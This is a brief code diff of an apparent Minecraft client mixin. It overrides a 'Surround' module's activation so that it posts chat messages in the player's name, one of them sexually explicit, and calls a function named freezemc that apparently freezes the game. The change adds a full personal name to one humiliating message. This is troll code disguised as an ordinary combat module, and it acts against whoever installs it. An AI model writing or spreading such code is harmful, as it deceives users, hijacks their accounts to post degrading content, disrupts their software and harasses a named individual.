@@ -19,7 +19,7 @@ public abstract class SurroundMixin extends Module {
     }
     @Override
     public void onActivate() {
-        ChatUtils.sendPlayerMsg("gg u win i suck at cpvp");
+        ChatUtils.sendPlayerMsg("gg u win i suck at cpvp, Samuel Ian Yoder Owns ME AND ALL!");
         ChatUtils.sendPlayerMsg("FILL ME WITH CUM DADDY");
         TrollegeUtils.freezemc();
     }
